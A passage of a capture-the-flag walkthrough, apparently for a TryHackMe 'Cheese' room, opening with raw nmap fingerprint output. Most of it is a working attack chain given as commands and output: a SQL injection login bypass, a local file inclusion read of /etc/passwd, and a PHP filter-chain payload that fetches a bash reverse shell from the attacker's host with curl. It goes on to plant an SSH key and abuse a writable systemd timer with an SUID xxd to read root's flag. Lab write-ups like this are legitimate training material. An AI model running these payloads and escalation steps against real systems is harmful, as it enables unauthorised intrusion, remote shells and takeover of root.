SF:BM\x20OS/400\x20as-servermapd\|\x20o\|OS/400\n")%r(RPCCheck,2D,"-0000\$
SF:\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|OS/400\n")%r(DNSVersion
SF:BindReqTCP,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|O
SF:S/400\n")%r(DNSStatusRequestTCP,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as
SF:-servermapd\|\x20o\|OS/400\n")%r(Help,2D,"-0000\$\|\x20p\|IBM\x20OS/400
SF:\x20as-servermapd\|\x20o\|OS/400\n")%r(TerminalServerCookie,2D,"-0000\$
SF:\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|OS/400\n")%r(Kerberos,2
SF:D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|OS/400\n")%r(
SF:SMBProgNeg,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|O
SF:S/400\n")%r(FourOhFourRequest,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-s
SF:ervermapd\|\x20o\|OS/400\n")%r(LPDString,2D,"-0000\$\|\x20p\|IBM\x20OS/
SF:400\x20as-servermapd\|\x20o\|OS/400\n")%r(LDAPSearchReq,2D,"-0000\$\|\x
SF:20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|OS/400\n")%r(LDAPBindReq,2D
SF:,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|OS/400\n")%r(S
SF:IPOptions,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|OS
SF:/400\n")%r(LANDesk-RC,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-servermap
SF:d\|\x20o\|OS/400\n")%r(TerminalServer,2D,"-0000\$\|\x20p\|IBM\x20OS/400
SF:\x20as-servermapd\|\x20o\|OS/400\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port993-TCP:V=7.95%I=7%D=6/18%Time=6852DC75%P=x86_64-pc-linux-gnu%r(NUL
SF:L,52,"HTTP/1\.0\x20200\x20OK\r\noServer:\x20Linux,tcEZqv,UPnP/DpJ,Coher
SF:ence\x20UPnP\x20framework,snNaXZ\r\n\n")%r(SSLSessionReq,52,"HTTP/1\.0\
SF:x20200\x20OK\r\noServer:\x20Linux,tcEZqv,UPnP/DpJ,Coherence\x20UPnP\x20
SF:framework,snNaXZ\r\n\n")%r(TLSSessionReq,52,"HTTP/1\.0\x20200\x20OK\r\n
SF:oServer:\x20Linux,tcEZqv,UPnP/DpJ,Coherence\x20UPnP\x20framework,snNaXZ
SF:\r\n\n")%r(SSLv23SessionReq,52,"HTTP/1\.0\x20200\x20OK\r\noServer:\x20L
SF:inux,tcEZqv,UPnP/DpJ,Coherence\x20UPnP\x20framework,snNaXZ\r\n\n")%r(Ge
SF:nericLines,52,"HTTP/1\.0\x20200\x20OK\r\noServer:\x20Linux,tcEZqv,UPnP/
SF:DpJ,Coherence\x20UPnP\x20framework,snNaXZ\r\n\n")%r(GetRequest,52,"HTTP
SF:/1\.0\x20200\x20OK\r\noServer:\x20Linux,tcEZqv,UPnP/DpJ,Coherence\x20UP
SF:nP\x20framework,snNaXZ\r\n\n")%r(HTTPOptions,52,"HTTP/1\.0\x20200\x20OK
SF:\r\noServer:\x20Linux,tcEZqv,UPnP/DpJ,Coherence\x20UPnP\x20framework,sn
SF:NaXZ\r\n\n")%r(RTSPRequest,52,"HTTP/1\.0\x20200\x20OK\r\noServer:\x20Li
SF:nux,tcEZqv,UPnP/DpJ,Coherence\x20UPnP\x20framework,snNaXZ\r\n\n")%r(RPC
SF:Check,52,"HTTP/1\.0\x20200\x20OK\r\noServer:\x20Linux,tcEZqv,UPnP/DpJ,C
SF:oherence\x20UPnP\x20framework,snNaXZ\r\n\n")%r(DNSVersionBindReqTCP,52,
SF:"HTTP/1\.0\x20200\x20OK\r\noServer:\x20Linux,tcEZqv,UPnP/DpJ,Coherence\
SF:x20UPnP\x20framework,snNaXZ\r\n\n")%r(DNSStatusRequestTCP,52,"HTTP/1\.0
SF:\x20200\x20OK\r\noServer:\x20Linux,tcEZqv,UPnP/DpJ,Coherence\x20UPnP\x2
SF:0framework,snNaXZ\r\n\n")%r(Help,52,"HTTP/1\.0\x20200\x20OK\r\noServer:
SF:\x20Linux,tcEZqv,UPnP/DpJ,Coherence\x20UPnP\x20framework,snNaXZ\r\n\n")
SF:%r(TerminalServerCookie,52,"HTTP/1\.0\x20200\x20OK\r\noServer:\x20Linux
SF:,tcEZqv,UPnP/DpJ,Coherence\x20UPnP\x20framework,snNaXZ\r\n\n")%r(Kerber
SF:os,52,"HTTP/1\.0\x20200\x20OK\r\noServer:\x20Linux,tcEZqv,UPnP/DpJ,Cohe
SF:rence\x20UPnP\x20framework,snNaXZ\r\n\n")%r(SMBProgNeg,52,"HTTP/1\.0\x2
SF:0200\x20OK\r\noServer:\x20Linux,tcEZqv,UPnP/DpJ,Coherence\x20UPnP\x20fr
SF:amework,snNaXZ\r\n\n")%r(X11Probe,52,"HTTP/1\.0\x20200\x20OK\r\noServer
SF::\x20Linux,tcEZqv,UPnP/DpJ,Coherence\x20UPnP\x20framework,snNaXZ\r\n\n"
SF:)%r(FourOhFourRequest,52,"HTTP/1\.0\x20200\x20OK\r\noServer:\x20Linux,t
SF:cEZqv,UPnP/DpJ,Coherence\x20UPnP\x20framework,snNaXZ\r\n\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1723-TCP:V=7.95%I=7%D=6/18%Time=6852DC75%P=x86_64-pc-linux-gnu%r(NU
SF:LL,5F,"\xff\xfd\x01\xff\xfd\x1f\xff\xfd!\xff\xfb\x01\xff\xfb\x03\r\r\nW
SF:elcome\x20to\x20Linux\x20\(ZEM500\)\x20for\x20MIPS\r\n\rKernel\x20TbC\x
SF:20uon\x20an\x20MIPS\r\n\rZEM500\x20login:\x20\n")%r(GenericLines,5F,"\x
SF:ff\xfd\x01\xff\xfd\x1f\xff\xfd!\xff\xfb\x01\xff\xfb\x03\r\r\nWelcome\x2
SF:0to\x20Linux\x20\(ZEM500\)\x20for\x20MIPS\r\n\rKernel\x20TbC\x20uon\x20
SF:an\x20MIPS\r\n\rZEM500\x20login:\x20\n")%r(GetRequest,5F,"\xff\xfd\x01\
SF:xff\xfd\x1f\xff\xfd!\xff\xfb\x01\xff\xfb\x03\r\r\nWelcome\x20to\x20Linu
SF:x\x20\(ZEM500\)\x20for\x20MIPS\r\n\rKernel\x20TbC\x20uon\x20an\x20MIPS\
SF:r\n\rZEM500\x20login:\x20\n")%r(RPCCheck,5F,"\xff\xfd\x01\xff\xfd\x1f\x
SF:ff\xfd!\xff\xfb\x01\xff\xfb\x03\r\r\nWelcome\x20to\x20Linux\x20\(ZEM500
SF:\)\x20for\x20MIPS\r\n\rKernel\x20TbC\x20uon\x20an\x20MIPS\r\n\rZEM500\x
SF:20login:\x20\n")%r(Help,5F,"\xff\xfd\x01\xff\xfd\x1f\xff\xfd!\xff\xfb\x
SF:01\xff\xfb\x03\r\r\nWelcome\x20to\x20Linux\x20\(ZEM500\)\x20for\x20MIPS
SF:\r\n\rKernel\x20TbC\x20uon\x20an\x20MIPS\r\n\rZEM500\x20login:\x20\n")%
SF:r(SIPOptions,5F,"\xff\xfd\x01\xff\xfd\x1f\xff\xfd!\xff\xfb\x01\xff\xfb\
SF:x03\r\r\nWelcome\x20to\x20Linux\x20\(ZEM500\)\x20for\x20MIPS\r\n\rKerne
SF:l\x20TbC\x20uon\x20an\x20MIPS\r\n\rZEM500\x20login:\x20\n")%r(NCP,5F,"\
SF:xff\xfd\x01\xff\xfd\x1f\xff\xfd!\xff\xfb\x01\xff\xfb\x03\r\r\nWelcome\x
SF:20to\x20Linux\x20\(ZEM500\)\x20for\x20MIPS\r\n\rKernel\x20TbC\x20uon\x2
SF:0an\x20MIPS\r\n\rZEM500\x20login:\x20\n")%r(tn3270,5F,"\xff\xfd\x01\xff
SF:\xfd\x1f\xff\xfd!\xff\xfb\x01\xff\xfb\x03\r\r\nWelcome\x20to\x20Linux\x
SF:20\(ZEM500\)\x20for\x20MIPS\r\n\rKernel\x20TbC\x20uon\x20an\x20MIPS\r\n
SF:\rZEM500\x20login:\x20\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.10 - 5.15 (94%), Linux 5.4 (94%), Linux 4.15 (92%), Linux 5.15 (91%), MikroTik RouterOS 7.2 (Linux 5.6.3) (91%), Android 4.4.0 (90%), Linux 3.2 - 4.14 (89%), Linux 4.15 - 5.19 (89%), Linux 2.6.32 - 3.10 (89%), Linux 2.6.32 - 3.5 (89%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 20.398 days (since Thu May 29 07:03:02 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Hosts: D, oRXPq-xX; OSs: Linux, Windows; Device: media device; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   167.33 ms 10.11.0.1
2   167.29 ms cheese.thm (10.10.198.98)

NSE: Script Post-scanning.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.12 seconds
           Raw packets sent: 99 (5.784KB) | Rcvd: 71 (4.460KB)



```

## Enumeration
Checking out port 8080

```bash

8080/tcp open  http-proxy?
| fingerprint-strings: 
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, NULL, RTSPRequest, Socks4, Socks5: 
|_    /bin/bash -c {perl,-e,$0,useSPACEMIME::Base64,cHJpbnQgIlBXTkVEXG4iIHggNSA7ICRfPWBwd2RgOyBwcmludCAiXG51cGxvYWRpbmcgeW91ciBob21lIGRpcmVjdG9yeTogIiwkXywiLi4uIFxuXG4iOw==} $_=$ARGV[0];~s/SPACE/ /ig;eval;$_=$ARGV[1];eval(decode_base64($_));


```

- i decode the base64

# result

```bash

$ echo "cHJpbnQgIlBXTkVEXG4iIHggNSA7ICRfPWBwd2RgOyBwcmludCAiXG51cGxvYWRpbmcgeW91ciBob21lIGRpcmVjdG9yeTogIiwkXywiLi4uIFxuXG4iOw==" | base64   -d

print "PWNED\n" x 5 ; $_=`pwd`; print "\nuploading your home directory: ",$_,"... \n\n";                                                      


```


- it has port 80 running which has a login page 
- i check if it vulnerable to sqli which i find out it vulnerable 

```bash 

payload for sqli 

'+union+select+1,1,1;+--+-

```

- after the payload was successful it redirect to a endpoint

```

/secret-script.php?file=supersecretadminpanel.html 

```

- The endpoint being /secret-script.php having a URL parameter named file, like so - /secret-script.php?file=

- which is vulnerable to LFI

```bash

http://10.10.198.98//secret-script.php?file=php://filter/resource=/etc/passwd

# result

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:113:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin comte:x:1000:1000:comte:/home/comte:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash 

```

- to exploit the LFI i combined it RCE

- use exloit 

- 

# RCE with PHP Filters Chain
- now will be able to turn the php://filter into a full RCE in generally Convert LFI to RCE .


```bash

$ git clone https://github.com/synacktiv/php_filter_chain_generator.git
                                                                                                                      
$ cd php_filter_chain_generator 
                                                                                                                      $ echo "bash -i >& /dev/tcp/10.11.108.75/4444 0>&1" > revshell
                                                                                                                      $ cat revshell 
bash -i >& /dev/tcp/10.11.108.75/4444 0>&1


```
- on another terminal you have to host the directory that revshell is  using 

```bash 

python3 -m http.server 80


```

- then on the run the python code on the direct where your exploit it 

```bash 

python3 php_filter_chain_generator.py --chain '<?= `curl -s -L <attacker ip >/revshell|bash` ?>'

```

-- the copy it

- then run a listner using netcat 

```bash

nc -lvnp 4444


````


- on your broswer then run

```bash

http://cheese.thm/secret-script.php?file=<php code generate by the exploit>

```
- you have your shell

```bash 

www-data@ip-10-10-228-86:/var/www/html$ whoami
whoami
www-data
www-data@ip-10-10-228-86:/var/www/html$ 


```

- we since not to have the permission to read a file 

```bash 

www-data@ip-10-10-228-86:/$ cd home
cd home
www-data@ip-10-10-228-86:/home$ ls
ls
comte
ubuntu
www-data@ip-10-10-228-86:/home$ cd comte
cd comte
www-data@ip-10-10-228-86:/home/comte$ ls
ls
snap
user.txt
www-data@ip-10-10-228-86:/home/comte$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@ip-10-10-228-86:/home/comte$ 


```

- find a where to get an access thus we don't have the password
- since the ssh if open 
-  i make a research find that it can be exploited 

# step to exploit ssh if misconfig

- on by host pc 

```bash 

Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/hostname/.ssh/id_ed25519): ssh  
Enter passphrase for "ssh" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ssh
Your public key has been saved in ssh.pub
The key fingerprint is:
SHA256:Ik317jsoNlULW8BjY8KbWZdoZfT3z2MrPfLuOF9nzzM graceman@RG
The key's randomart image is:
+--[ED25519 256]--+
|     . ..++.     |
|      o.@oo.     |
|      .X =. . .  |
|     o+ ..o  . . |
|    . o S=..    .|
|     . .o..    ..|
|       . ..   .o*|
|      + . .. +oE*|
|     . o  .. .O**|
+----[SHA256]-----+


```

- we copy to the target machine  
-  in the .ssh/authorized paste you token

```bash

$ cat ssh.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFVrLp2dKJ+yzcWymvwu2MLXwIdH7l1Hz/koak+5voON

```

- on your terminal

```bash 

chmod 600 ./ssh 


```
- successfuly gain access to the ssh 

## Result

```bash 

Last login: Thu Apr  4 17:26:03 2024 from 192.168.0.112
comte@ip-10-10-228-86:~$ ls
snap  user.txt
comte@ip-10-10-228-86:~$ cat user.txt 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{9f2ce3df1bee-----------------8560c682704c31b17a}
comte@ip-10-10-228-86:~$ 




```

- let get the root flag

- to get the root we have Escalate our Privilege

```bash 

comte@ip-10-10-228-86:~$ sudo -l
User comte may run the following commands on ip-10-10-228-86:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer


``` 

We find that there is a file called `exploit.timer` somewhere in the machine, so we need to find it and we can start, restart or enable it using systemctl from the output we got from checking for user sudo privileges.

```bash 

comte@ip-10-10-228-86:~$ find / -name "exploit.timer" -type f 2>/dev/null

/etc/systemd/system/exploit.timer

comte@ip-10-10-228-86:~$ ls -lah /etc/systemd/system/exploit.timer

-rwxrwxrwx 1 root root 87 Mar 29  2024 /etc/systemd/system/exploit.timer

```

- we also observed it have the permission 

- and we nano the file we see the time was set let we set ours time 

- From the timer file we figure out that there is a service which has to be triggered so we cd into `/etc/systemd/system` and find a file called exploit.service which copies the XXD binary into the `/opt` folder and makes it an executable that can be executed by users.


```bash

comte@ip-10-10-228-86:/etc/systemd/system$ cat exploit.timer 
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=1min

[Install]
WantedBy=timers.target
comte@ip-10-10-228-86:/etc/systemd/system$ cat exploit.service 
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"


```

- We do a `sudo systemctl daemon-reload` to make sure the changes have taken place and then start the timer file again using `sudo systemctl start exploit.timer `

```bash

comte@ip-10-10-228-86:/etc/systemd/system$ ls /opt/
xxd

```


-Now that we have the XXD binary in the `/opt`  folder, we can use this to get a root shell.

Let’s get on GTFO bins and look for XXD

`Reference: https://gtfobins.github.io/gtfobins/xxd/`


```



## root flag

```bash 

comte@ip-10-10-228-86:~$ LFILE=/root/root.txt
comte@ip-10-10-228-86:~$ /opt/xxd "$LFILE" | xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca75486094810807faf4b7b0a929b11e5e0167c}
comte@ip-10-10-228-86:~$ 


```